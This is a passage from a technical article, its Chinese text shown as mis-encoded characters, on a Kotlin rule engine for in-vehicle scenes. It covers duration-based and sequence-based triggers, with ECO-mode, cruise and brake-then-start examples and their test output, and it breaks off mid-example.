<h2 data-id="heading-8">ä¸‰ã€è¿›é˜¶éœ€æ±‚åˆ†æ</h2>
<p>åœ¨åŸºç¡€è§„åˆ™åŒ¹é…ä¹‹ä¸Šï¼ŒçœŸå®è½¦è½½åœºæ™¯å¸¸æ¶‰åŠæ›´å¤æ‚çš„æ—¶ç©ºé€»è¾‘ã€‚å¼•æ“é€šè¿‡ä¸¤ç§æœºåˆ¶åº”å¯¹å…¸å‹è¿›é˜¶éœ€æ±‚ï¼š</p>
<h3 data-id="heading-9">1. æŒç»­æ»¡è¶³ N ç§’æ‰è§¦å‘</h3>
<p>éœ€æ±‚èƒŒæ™¯ï¼šç¬æ—¶ä¿¡å·æ³¢åŠ¨ï¼ˆå¦‚é›·è¾¾è¯¯æŠ¥ã€GPSè·³å˜ï¼‰ä¸åº”å¯¼è‡´åœºæ™¯é¢‘ç¹åˆ‡æ¢ã€‚ å®ç°æ–¹æ¡ˆï¼š</p>
<ul>
<li>åœ¨ <code>Condition</code> ä¸­å¢åŠ  <code>durationMs</code> å­—æ®µã€‚</li>
<li><code>RuleEngine</code> åœ¨é¦–æ¬¡æ»¡è¶³æ¡ä»¶æ—¶è®°å½•æ—¶é—´æˆ³ï¼Œåç»­æ¯æ¬¡è¯„ä¼°æ£€æŸ¥ <code>(now - startTime) &gt;= durationMs</code>ã€‚</li>
<li>è‹¥æ¡ä»¶ä¸­é€”ä¸æ»¡è¶³ï¼Œåˆ™ç«‹å³æ¸…é™¤è®¡æ—¶çŠ¶æ€ã€‚</li>
<li>åˆ©ç”¨åç¨‹ <code>delay()</code> ç²¾ç¡®è°ƒåº¦é‡è¯„ä»»åŠ¡ï¼Œè€Œéä½æ•ˆè½®è¯¢ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¡ä»¶çŠ¶æ€è®°å½•</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> enterStates = ConcurrentHashMap&lt;String, MutableMap&lt;Condition, <span class="hljs-built_in">Long</span>&gt;&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> exitStates = ConcurrentHashMap&lt;String, MutableMap&lt;Condition, <span class="hljs-built_in">Long</span>&gt;&gt;()
<span class="hljs-comment">// åç¨‹ä¸ä»»åŠ¡ç®¡ç†</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> enterJobs = ConcurrentHashMap&lt;String, Job&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> exitJobs = ConcurrentHashMap&lt;String, Job&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> mutex = Mutex()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processEnterLogic</span><span class="hljs-params">(scene: <span class="hljs-type">Scene</span>, now: <span class="hljs-type">Long</span>, triggerSignal: <span class="hljs-type">Signal</span>?)</span></span> {
    <span class="hljs-keyword">val</span> enterState = enterStates.getOrPut(scene.id) { ConcurrentHashMap() }

<span class="hljs-comment">// 1. å¤„ç†åºåˆ—æ¡ä»¶ (å¦‚æœæœ‰)</span>
    <span class="hljs-keyword">val</span> seqCond = scene.enterConditions.filterIsInstance&lt;SequenceCondition&gt;().firstOrNull()
    <span class="hljs-keyword">val</span> seqSatisfied = <span class="hljs-keyword">if</span> (seqCond != <span class="hljs-literal">null</span>) {
        updateAndCheckSequence(scene.id, seqCond, triggerSignal, now)
    } <span class="hljs-keyword">else</span> <span class="hljs-literal">true</span>

    <span class="hljs-comment">// 2. å¤„ç†æ™®é€šæ¡ä»¶ (Duration é€»è¾‘)</span>
    <span class="hljs-keyword">val</span> normalConds = scene.enterConditions.filter { it !<span class="hljs-keyword">is</span> SequenceCondition }
<span class="hljs-keyword">var</span> allNormalSatisfied = <span class="hljs-literal">true</span>

    normalConds.forEach { cond -&gt;
<span class="hljs-keyword">if</span> (evaluateCondition(cond)) {
            enterState.putIfAbsent(cond, now) <span class="hljs-comment">// è®°å½•é¦–æ¬¡æ»¡è¶³çš„æ—¶é—´æˆ³</span>
        } <span class="hljs-keyword">else</span> {
            enterState.remove(cond) <span class="hljs-comment">// ä¸€æ—¦ä¸æ»¡è¶³ç«‹å³æ¸…é™¤è®¡æ—¶</span>
            allNormalSatisfied = <span class="hljs-literal">false</span>
        }
    }

<span class="hljs-comment">// 3. ç»¼åˆåˆ¤å®š</span>
    <span class="hljs-keyword">if</span> (allNormalSatisfied &amp;&amp; seqSatisfied &amp;&amp; scene.enterConditions.isNotEmpty()) {
        <span class="hljs-keyword">val</span> allDurationMet = normalConds.all { cond -&gt;
<span class="hljs-keyword">val</span> startTime = enterState[cond] ?: now
            (now - startTime) &gt;= cond.durationMs
        }

<span class="hljs-keyword">if</span> (allDurationMet) {
            enterJobs[scene.id]?.cancel()
            scene.enter()
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// è®¡ç®—è¿˜éœ€è¦ç­‰å¾…å¤šä¹…</span>
            <span class="hljs-keyword">val</span> remainingWait = normalConds.maxOf { cond -&gt;
<span class="hljs-keyword">val</span> elapsed = now - (enterState[cond] ?: now)
                (cond.durationMs - elapsed).coerceAtLeast(<span class="hljs-number">0L</span>)
            }
scheduleReEvaluation(scene, remainingWait, <span class="hljs-literal">true</span>)
        }
    } <span class="hljs-keyword">else</span> {
        enterJobs[scene.id]?.cancel()
    }
}
</code></pre>
<h3 data-id="heading-10">2. æ—¶åºæ•æ„Ÿå‹åœºæ™¯</h3>
<p>éœ€æ±‚èƒŒæ™¯ï¼šæŸäº›åœºæ™¯çš„è§¦å‘éœ€ä¸¥æ ¼æŒ‰é¡ºåºæ‰§è¡Œï¼ˆå¦‚â€œè¸©åˆ¹è½¦ â†’ æŒ‰å¯åŠ¨é”®â€ï¼‰ã€‚ å®ç°æ–¹æ¡ˆï¼š</p>
<ul>
<li>
<p>å¼•å…¥ <code>SequenceCondition</code>ï¼Œå°†å¤šæ­¥æ“ä½œå°è£…ä¸ºä¸€ä¸ªå¤åˆæ¡ä»¶ã€‚</p>
</li>
<li>
<p>å¼•æ“å†…éƒ¨ç»´æŠ¤æ¯ä¸ªåœºæ™¯çš„åºåˆ—è¿›åº¦ï¼ˆ<code>sequenceProgress</code>ï¼‰å’Œæ­¥éª¤é—´çš„æ—¶é—´çª—å£ï¼ˆ<code>timeoutMs</code>ï¼‰ã€‚</p>
</li>
<li>
<p>æ¯æ¬¡ä¿¡å·æ›´æ–°æ—¶ï¼š</p>
<ul>
<li>æ£€æŸ¥å‰ç½®æ­¥éª¤æ˜¯å¦ä»æœ‰æ•ˆï¼ˆé˜²æ­¢çŠ¶æ€å›é€€å¯¼è‡´é€»è¾‘é”™è¯¯ï¼‰ï¼›</li>
<li>è‹¥å½“å‰ä¿¡å·åŒ¹é…ä¸‹ä¸€æ­¥æ¡ä»¶ä¸”æœªè¶…æ—¶ï¼Œåˆ™æ¨è¿›è¿›åº¦ï¼›</li>
<li>è‹¥åºåˆ—å®Œæ•´åŒ¹é…ï¼Œåˆ™è§†ä¸ºæ¡ä»¶æ»¡è¶³ã€‚</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SequenceCondition</span>(
    <span class="hljs-keyword">val</span> steps: List&lt;SequenceStep&gt;
) : Condition {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> signalKey: String = steps.firstOrNull()?.condition?.signalKey ?: <span class="hljs-string">""</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> durationMs: <span class="hljs-built_in">Long</span> = <span class="hljs-number">0L</span>
}

<span class="hljs-comment">// åºåˆ—è¿›åº¦è¿½è¸ªï¼šsceneId -&gt; å½“å‰åŒ¹é…åˆ°çš„æ­¥éª¤ç´¢å¼•</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> sequenceProgress = ConcurrentHashMap&lt;String, <span class="hljs-built_in">Int</span>&gt;()
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lastStepTimestamp = ConcurrentHashMap&lt;String, <span class="hljs-built_in">Long</span>&gt;()

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateAndCheckSequence</span><span class="hljs-params">(sceneId: <span class="hljs-type">String</span>, seq: <span class="hljs-type">SequenceCondition</span>, signal: <span class="hljs-type">Signal</span>?, now: <span class="hljs-type">Long</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">val</span> currentIndex = sequenceProgress.getOrDefault(sceneId, <span class="hljs-number">0</span>)
    <span class="hljs-keyword">if</span> (currentIndex == <span class="hljs-number">0</span> &amp;&amp; signal == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>

    <span class="hljs-comment">// è·å–å½“å‰æ­£åœ¨ç­‰å¾…åŒ¹é…çš„æ­¥éª¤</span>
    <span class="hljs-keyword">val</span> currentStep = seq.steps[currentIndex]

    <span class="hljs-comment">// ç­–ç•¥ï¼šæ£€æŸ¥å·²ç»åŒ¹é…æˆåŠŸçš„é‚£äº›æ­¥éª¤æ˜¯å¦ä¾ç„¶æœ‰æ•ˆ</span>
    <span class="hljs-comment">// å¦‚æœåºåˆ—è¦æ±‚ A -&gt; Bï¼Œå½“å‰åœ¨ç­‰ Bï¼Œä½† A çªç„¶ä¸æ»¡è¶³äº†ï¼Œåºåˆ—åº”é‡ç½®</span>
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until currentIndex) {
        <span class="hljs-keyword">if</span> (!evaluateCondition(seq.steps[i].condition)) {
            sequenceProgress[sceneId] = <span class="hljs-number">0</span> <span class="hljs-comment">// å‰ç½®æ­¥éª¤å¤±æ•ˆï¼Œé‡ç½®</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
    }

    <span class="hljs-comment">// æ£€æŸ¥æ­¥éª¤é—´æ˜¯å¦è¶…æ—¶</span>
    <span class="hljs-keyword">val</span> lastTime = lastStepTimestamp.getOrDefault(sceneId, <span class="hljs-number">0L</span>)
    <span class="hljs-keyword">if</span> (currentIndex &gt; <span class="hljs-number">0</span> &amp;&amp; (now - lastTime) &gt; currentStep.timeoutMs) {
        sequenceProgress[sceneId] = <span class="hljs-number">0</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }

    <span class="hljs-comment">// å¤„ç†å½“å‰ä¿¡å·è§¦å‘çš„è¿›åº¦æ¨è¿›</span>
    <span class="hljs-keyword">if</span> (signal != <span class="hljs-literal">null</span> &amp;&amp; signal.key == currentStep.condition.signalKey) {
        <span class="hljs-keyword">if</span> (evaluateCondition(currentStep.condition)) {
            <span class="hljs-keyword">val</span> nextIndex = currentIndex + <span class="hljs-number">1</span>
            <span class="hljs-keyword">if</span> (nextIndex &gt;= seq.steps.size) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> <span class="hljs-comment">// åºåˆ—å…¨åŒ¹é…</span>
            } <span class="hljs-keyword">else</span> {
                sequenceProgress[sceneId] = nextIndex
                lastStepTimestamp[sceneId] = now
            }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentIndex &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å¦‚æœæ˜¯å½“å‰æ­¥éª¤çš„ä¿¡å·å‘ç”Ÿäº†å˜åŒ–ä¸”å˜å¾—ä¸æ»¡è¶³ï¼Œé‡ç½®</span>
            sequenceProgress[sceneId] = <span class="hljs-number">0</span>
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
}
</code></pre>
<h2 data-id="heading-11">å››ã€ä½¿ç”¨æ–¹å¼</h2>
<h3 data-id="heading-12">1. æ»¡è¶³æ¡ä»¶å³å¯è‡ªåŠ¨è§¦å‘çš„åœºæ™¯</h3>
<p>è§„åˆ™ï¼šè½¦è¾†ç”µé‡ä½äº 20% æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ ECO æ¨¡å¼ï¼Œç”µé‡é«˜äº60ï¼… æ—¶ï¼Œè‡ªåŠ¨é€€å‡º ECO æ¨¡å¼</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 1. è‡ªåŠ¨è§¦å‘ECOæ¨¡å¼</span>
<span class="hljs-comment">// è§„åˆ™ï¼šè½¦è¾†ç”µé‡ä½äº 20% æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ ECO æ¨¡å¼ï¼Œç”µé‡é«˜äº60ï¼… æ—¶ï¼Œè‡ªåŠ¨é€€å‡º ECO æ¨¡å¼</span>
<span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">ecoScene</span> = <span class="hljs-selector-tag">Scene</span><span class="hljs-selector-class">.create</span>(
    id = <span class="hljs-string">"eco_mode"</span>,
    name = <span class="hljs-string">"ECO æ¨¡å¼"</span>,
    enterActions = <span class="hljs-built_in">listOf</span>(<span class="hljs-built_in">Action</span>(<span class="hljs-string">"enable_eco_mode"</span>, <span class="hljs-built_in">mapOf</span>(<span class="hljs-string">"mode"</span> to <span class="hljs-string">"eco"</span>))),
    exitActions = <span class="hljs-built_in">listOf</span>(<span class="hljs-built_in">Action</span>(<span class="hljs-string">"disable_eco_mode"</span>, <span class="hljs-built_in">mapOf</span>(<span class="hljs-string">"mode"</span> to <span class="hljs-string">"eco"</span>))),
    enterConditions = <span class="hljs-built_in">listOf</span>(
        Condition.<span class="hljs-built_in">LessThan</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">20</span>)
    ),
    exitConditions = <span class="hljs-built_in">listOf</span>(
        Condition.<span class="hljs-built_in">GreaterThan</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">60</span>)
    ),
    onEnter = { <span class="hljs-selector-tag">actions</span> <span class="hljs-selector-tag">-</span>&gt;
 <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ğŸŸ¢ [åœºæ™¯æ¿€æ´»] å·²è¿›å…¥ ECO æ¨¡å¼ï¼šå¼€å¯èŠ‚èƒ½æ¨¡å¼\n"</span>)
        <span class="hljs-comment">// è§£æ actions æ‰§è¡Œå…¶ä»–æ“ä½œ</span>
    } ,
    <span class="hljs-selector-tag">onExit</span> = { <span class="hljs-selector-tag">actions</span> <span class="hljs-selector-tag">-</span>&gt;
 <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ğŸ”´ [åœºæ™¯é€€å‡º] å·²é€€å‡º ECO æ¨¡å¼ï¼šå…³é—­èŠ‚èƒ½æ¨¡å¼\n"</span>)
    } ,
)
<span class="hljs-selector-tag">engine</span><span class="hljs-selector-class">.addScene</span>(ecoScene)

<span class="hljs-comment">// --- æµ‹è¯• 1: åºåˆ—äº‹ä»¶éªŒè¯ ---</span>
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"--- æµ‹è¯• 1: æµ‹è¯•åœºæ™¯å¼•æ“ï¼ˆè‡ªåŠ¨è§¦å‘ECOæ¨¡å¼ï¼‰ ---"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">10</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">30</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">50</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"battery_level"</span>, <span class="hljs-number">70</span>))
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<ul>
<li>å½“å¼•æ“æ¥æ”¶åˆ°ç”µé‡=10æ—¶ï¼Œè‡ªåŠ¨è§¦å‘ã€Ecoæ¨¡å¼ã€‘</li>
<li>å½“å¼•æ“æ¥æ”¶åˆ°ç”µé‡=70æ—¶ï¼Œè‡ªåŠ¨é€€å‡ºã€Ecoæ¨¡å¼ã€‘</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">--- æµ‹è¯• 1: æµ‹è¯•åœºæ™¯å¼•æ“ï¼ˆè‡ªåŠ¨è§¦å‘ECOæ¨¡å¼ï¼‰ ---
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">10</span>)
ğŸŸ¢ <span class="hljs-section">[åœºæ™¯æ¿€æ´»]</span> å·²è¿›å…¥ ECO æ¨¡å¼ï¼šå¼€å¯èŠ‚èƒ½æ¨¡å¼

<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">30</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">50</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=battery_level, value=<span class="hljs-number">70</span>)
ğŸ”´ <span class="hljs-section">[åœºæ™¯é€€å‡º]</span> å·²é€€å‡º ECO æ¨¡å¼ï¼šå…³é—­èŠ‚èƒ½æ¨¡å¼
</code></pre>
<h3 data-id="heading-13">2. æŒç»­æ»¡è¶³è§„å®šçš„æ—¶é—´æ‰å¯è§¦å‘çš„åœºæ™¯</h3>
<p>è§„åˆ™ï¼šè½¦é€Ÿå¿…é¡»å¤§äº 80 km/hï¼Œä¸”æŒç»­ 5 ç§’æ‰èƒ½è§¦å‘ï¼ˆé˜²æ­¢å› ç¬é—´åŠ é€Ÿè¯¯è§¦å‘ï¼‰ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 2. å®šä¹‰å¸¦æŒç»­æ—¶é—´çš„åœºæ™¯ï¼šé«˜é€Ÿå·¡èˆªæ¨¡å¼</span>
<span class="hljs-comment">// è§„åˆ™ï¼šè½¦é€Ÿå¿…é¡»å¤§äº 80 km/hï¼Œä¸”æŒç»­ 5 ç§’ï¼Œé˜²æ­¢å› ç¬é—´åŠ é€Ÿè¯¯è§¦å‘</span>
val highSpeedScene = Scene<span class="hljs-selector-class">.create</span>(
    id = "high_speed_cruise",
    name = "é«˜é€Ÿå·¡èˆªæ¨¡å¼",
    enterConditions = listOf(
        Condition.GreaterThan("speed", <span class="hljs-number">80</span>, duration = <span class="hljs-number">5000</span>) <span class="hljs-comment">// å¿…é¡»æŒç»­ 5s</span>
    ),
    exitConditions = <span class="hljs-built_in">listOf</span>(
        Condition.LessThan("speed", <span class="hljs-number">70</span>) <span class="hljs-comment">// é€€å‡ºåˆ™ä¸éœ€è¦æŒç»­æ—¶é—´</span>
    ),
    onEnter = { actions -&gt;
 <span class="hljs-built_in">println</span>("ğŸŸ¢ [åœºæ™¯æ¿€æ´»] å·²è¿›å…¥é«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå±•å¼€å°¾ç¿¼\n")
        <span class="hljs-comment">// è§£æ actions æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œå¦‚è°ƒæ•´å‘åŠ¨æœºæ€§èƒ½</span>
    } ,
    onExit = { actions -&gt;
 <span class="hljs-built_in">println</span>("ğŸ”´ [åœºæ™¯é€€å‡º] é€€å‡ºé«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå…³é—­å°¾ç¿¼\n")
    }
)
engine<span class="hljs-selector-class">.addScene</span>(highSpeedScene)

<span class="hljs-comment">// --- æµ‹è¯• 2: æŒç»­æ—¶é—´éªŒè¯ ---</span>
<span class="hljs-built_in">println</span>("--- æµ‹è¯• <span class="hljs-number">2</span>: å¼€å§‹æŒç»­æ—¶é—´éªŒè¯ (Speed &gt; <span class="hljs-number">80</span> for <span class="hljs-number">5s</span>) ---")
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">100</span>))
<span class="hljs-built_in">println</span>("å½“å‰è½¦é€Ÿ <span class="hljs-number">100</span>ï¼Œç­‰å¾…å¼•æ“è®¡æ—¶...")
<span class="hljs-comment">// æ¨¡æ‹Ÿ 3 ç§’åæŸ¥çœ‹çŠ¶æ€ï¼ˆæ­¤æ—¶ä¸åº”æ¿€æ´»ï¼Œå› ä¸ºæœªæ»¡ 5sï¼‰</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
<span class="hljs-built_in">println</span>("è®¡æ—¶ <span class="hljs-number">3s</span> æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: ${engine.isSceneActive(highSpeedScene.id)}")
<span class="hljs-comment">// å†ç­‰ 3 ç§’ï¼ˆæ€»è®¡ 6sï¼‰ï¼Œåº”è¯¥æ¿€æ´»</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
<span class="hljs-built_in">println</span>("è®¡æ—¶ <span class="hljs-number">6s</span> æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: ${engine.isSceneActive(highSpeedScene.id)}")
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">67</span>))
<span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>)

<span class="hljs-comment">// --- æµ‹è¯• 3: ä¿¡å·æŠ–åŠ¨æ‹¦æˆª ---</span>
<span class="hljs-built_in">println</span>("--- æµ‹è¯• <span class="hljs-number">3</span>: æµ‹è¯•ä¿¡å·æŠ–åŠ¨æ˜¯å¦ä¼šé‡ç½®è®¡æ—¶ ---")
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">60</span>)) <span class="hljs-comment">// å…ˆé™é€Ÿ</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>)
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">120</span>)) <span class="hljs-comment">// é‡æ–°æé€Ÿ</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
SignalManager<span class="hljs-selector-class">.updateSignal</span>(Signal("speed", <span class="hljs-number">50</span>)) <span class="hljs-comment">// åœ¨ 5s åˆ°è¾¾å‰çªç„¶é™é€Ÿ</span>
<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>)
<span class="hljs-built_in">println</span>(
    "ä¿¡å·æŠ–åŠ¨åï¼ˆæœªæ»¡<span class="hljs-number">5s</span>å³ä¸­æ–­ï¼‰ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: ${
        engine.isSceneActive(
            highSpeedScene.id
        )
    }"
)
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<ul>
<li>è½¦é€Ÿ=100æ—¶ï¼Œã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘æ²¡æœ‰ç«‹å³æ¿€æ´»</li>
<li>æŒç»­5såï¼Œè‡ªåŠ¨è§¦å‘ã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘</li>
<li>è½¦é€Ÿ=67æ—¶ï¼Œè‡ªåŠ¨é€€å‡ºã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘</li>
<li>å½“è½¦é€Ÿå…ˆé€’å¢è‡³120ï¼Œå†ä¸‹é™è‡³50ï¼Œä¸ä¼šè§¦å‘ã€é«˜é€Ÿå·¡èˆªæ¨¡å¼ã€‘</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">--- æµ‹è¯• 2: å¼€å§‹æŒç»­æ—¶é—´éªŒè¯ (Speed &gt; 80 for 5s) ---
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">100</span>)
å½“å‰è½¦é€Ÿ 100ï¼Œç­‰å¾…å¼•æ“è®¡æ—¶...
è®¡æ—¶ 3s æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: false
ğŸŸ¢ <span class="hljs-section">[åœºæ™¯æ¿€æ´»]</span> å·²è¿›å…¥é«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå±•å¼€å°¾ç¿¼

è®¡æ—¶ 6s æ—¶ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: true
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">67</span>)
ğŸ”´ <span class="hljs-section">[åœºæ™¯é€€å‡º]</span> é€€å‡ºé«˜é€Ÿå·¡èˆªæ¨¡å¼ï¼šå…³é—­å°¾ç¿¼

--- æµ‹è¯• 3: æµ‹è¯•ä¿¡å·æŠ–åŠ¨æ˜¯å¦ä¼šé‡ç½®è®¡æ—¶ ---
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">60</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">120</span>)
<span class="hljs-section">[updateSignal]</span>: Signal(<span class="hljs-attr">key</span>=speed, value=<span class="hljs-number">50</span>)
ä¿¡å·æŠ–åŠ¨åï¼ˆæœªæ»¡5så³ä¸­æ–­ï¼‰ï¼Œé«˜é€Ÿå·¡èˆªåœºæ™¯æ˜¯å¦æ¿€æ´»: false
</code></pre>
<h3 data-id="heading-14">3. æ»¡è¶³è§„å®šçš„åºåˆ—æ‰å¯è§¦å‘çš„åœºæ™¯</h3>
<p>è§„åˆ™ï¼šå¿…é¡»å…ˆâ€œè¸©ä¸‹åˆ¹è½¦â€ï¼Œç„¶ååœ¨ 3 ç§’å†…â€œæŒ‰ä¸‹å¯åŠ¨é”®â€ï¼Œæ‰èƒ½æ¿€æ´»â€œåŠ¨åŠ›ç³»ç»Ÿâ€ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 3. å¸¦åºåˆ—çš„å®‰å…¨å¯åŠ¨æ ¡éªŒåœºæ™¯</span>
<span class="hljs-comment">// è§„åˆ™ï¼šå¿…é¡»å…ˆâ€œè¸©ä¸‹åˆ¹è½¦â€ï¼Œç„¶ååœ¨ 3 ç§’å†…â€œæŒ‰ä¸‹å¯åŠ¨é”®â€ï¼Œæ‰èƒ½æ¿€æ´»â€œåŠ¨åŠ›ç³»ç»Ÿâ€</span>
<span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">securitySequenceScene</span> = <span class="hljs-selector-tag">Scene</span><span class="hljs-selector-class">.create</span>(
    id = <span class="hljs-string">"security_start"</span>,
    name = <span class="hljs-string">"å®‰å…¨å¯åŠ¨æ¨¡å¼"</span>,
    enterConditions = <span class="hljs-built_in">listOf</span>(
        <span class="hljs-built_in">SequenceCondition</span>(
            steps = <span class="hljs-built_in">listOf</span>(
                <span class="hljs-built_in">SequenceStep</span>(
                    Condition.<span class="hljs-built_in">Equals</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"pressed"</span>), timeoutMs = <span class="hljs-number">0</span>
                ),
                <span class="hljs-built_in">SequenceStep</span>(
                    Condition.<span class="hljs-built_in">Equals</span>(<span class="hljs-string">"start_button"</span>, <span class="hljs-string">"clicked"</span>), timeoutMs = <span class="hljs-number">3000</span>
                )
            )
        )
    ),
    enterActions = <span class="hljs-built_in">listOf</span>(<span class="hljs-built_in">Action</span>(<span class="hljs-string">"enable_motor"</span>, <span class="hljs-built_in">mapOf</span>(<span class="hljs-string">"power"</span> to <span class="hljs-number">100</span>))),
    onEnter = { <span class="hljs-selector-tag">println</span>(<span class="hljs-string">"ğŸŸ¢ [åœºæ™¯æ¿€æ´»] å®‰å…¨æ ¡éªŒé€šè¿‡ï¼šåŠ¨åŠ›ç³»ç»Ÿå·²å°±ç»ªï¼\n"</span>) }
)
<span class="hljs-selector-tag">engine</span><span class="hljs-selector-class">.addScene</span>(securitySequenceScene)

<span class="hljs-comment">// --- æµ‹è¯• 4: åºåˆ—äº‹ä»¶éªŒè¯ ---</span>
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"--- æµ‹è¯• 4: å¼€å§‹å®‰å…¨å¯åŠ¨åºåˆ—æµ‹è¯• ---"</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"å…ˆè¸©ä¸‹åˆ¶åŠ¨è¸æ¿"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"pressed"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
<span class="hljs-selector-tag">println</span>(<span class="hljs-string">"æ¾å¼€åˆ¶åŠ¨è¸æ¿"</span>)
<span class="hljs-selector-tag">SignalManager</span><span class="hljs-selector-class">.updateSignal</span>(<span class="hljs-built_in">Signal</span>(<span class="hljs-string">"brake_pedal"</span>, <span class="hljs-string">"unpressed"</span>))
<span class="hljs-selector-tag">delay</span>(<span class="hljs-number">1000</span>)
